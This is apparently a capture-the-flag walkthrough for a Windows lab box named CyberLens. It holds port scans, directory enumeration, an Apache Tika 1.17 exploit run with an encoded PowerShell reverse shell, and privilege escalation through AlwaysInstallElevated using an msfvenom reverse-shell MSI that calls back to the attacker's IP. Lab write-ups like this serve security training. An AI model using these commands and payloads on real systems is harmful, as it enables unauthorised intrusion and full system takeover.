```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
|_http-title: CyberLens: Unveiling the Hidden Matrix
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-19T16:00:05+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-18T15:52:27
| Not valid after:  2024-11-17T15:52:27
| MD5:   1197:9b42:b41c:c161:d202:ff38:6548:4049
|_SHA-1: 2ef5:df06:2375:6a89:d8d3:7314:ad57:cb6a:92ad:9c38
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-19T15:59:52+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-19T15:59:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

Checking port 80 first
Download a tree.jpg to check the output of this file, run gobuster while checking the page:
```
└─$ sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://cyberlens.thm/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cyberlens.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/Images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/Images/]
/aux                  (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/com1                 (Status: 403) [Size: 199]
/com2                 (Status: 403) [Size: 199]
/com4                 (Status: 403) [Size: 199]
/com3                 (Status: 403) [Size: 199]
/con                  (Status: 403) [Size: 199]
/css                  (Status: 301) [Size: 233] [--> http://cyberlens.thm/css/]
/images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/images/]
/js                   (Status: 301) [Size: 232] [--> http://cyberlens.thm/js/]
/lpt2                 (Status: 403) [Size: 199]
/lpt1                 (Status: 403) [Size: 199]
/nul                  (Status: 403) [Size: 199]
/prn                  (Status: 403) [Size: 199]
/secci�               (Status: 403) [Size: 199]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```

Start nmap on all ports after running gobuster
```
sudo nmap 10.10.210.247 -p- -oN nmapAll
```

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49677/tcp open  unknown
61777/tcp open  unknown

```

Seems like the metadata analyzer works with the apache tika parser. 

Checking the js, we can see that checking image metadata works with sending a fetch request to localhost:61777/meta. 

```js
http://cyberlens.thm/js/image-extractor.js

fetch("http://localhost:61777/meta", {
method: "PUT",
body: fileData,
headers: {
  "Accept": "application/json",
  "Content-Type": "application/octet-stream"
}
```

Enumerating this port further with nmap:

```
sudo nmap -sC -sV -p 61777 -oN nmap61777 cyberlens.thm
```

![[Pasted image 20240531142621.png]]

This is where Tika runs, showing it uses version 1.17

Checking exploitdb shows us that this is a vulnerable version:

```
https://www.exploit-db.com/exploits/46540
```

Let's grab a revshell from https://www.revshells.com/ 

I used the b64 encoded one to make it easier to use.
![[Pasted image 20240531145934.png]]

Set up your listener and execute the python file like this:

```
sudo python2.7 exp.py cyberlens.thm 61777 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAxAC4ANwAyAC4AMQAwADQAgAsADkAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYghAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEAbABvAHMAZQAoACkA'

```

This gives us powershell access as the user cyberlens
We can head to the desktop and get the first flag

Whil still on the desktop, we can download winpeasx64 from our attackbox

I decided to use certutil for the file transer, but you could also just use powershell or smb or whatever

Executing Winpeas will hang the shell for a bit, but after waiting for a bit it will show all information at once.

Reading the output shows that the AlwaysInstallElevated registry keys are enabled. We can see how to abuse this over at hacktricks


This would add anohter user as admin, but we can also directly call a reverse shell and gain access without polluting the system with another user. 

sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.104 LPORT=443 --platform windows -a x64 -f msi -o payload.msi


transfer the file and execute with /msiexec.exe /i payload.msi
catch the shell, profit
